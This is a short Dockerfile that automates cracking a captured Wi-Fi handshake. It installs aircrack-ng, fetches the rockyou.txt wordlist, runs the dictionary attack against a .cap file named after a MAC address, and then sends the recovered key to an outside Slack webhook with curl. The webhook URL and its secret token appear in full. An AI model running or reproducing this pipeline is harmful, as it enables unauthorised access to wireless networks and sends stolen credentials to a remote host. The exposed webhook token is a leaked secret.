FROM ubuntu:14.04
RUN sudo apt-get -y update
RUN sudo apt-get -y install aircrack-ng curl
COPY ./ /root/
WORKDIR /root/
RUN wget http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt
RUN touch log.txt
RUN aircrack-ng  8C:10:D4:E8:C1:96-01.cap -w rockyou.txt -q -l log.txt
RUN cat log.txt
RUN curl -X POST -H 'Content-type: application/json' --data '{"text":"Cracked!'$(cat log.txt)' "} https://hooks.slack.com/services/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
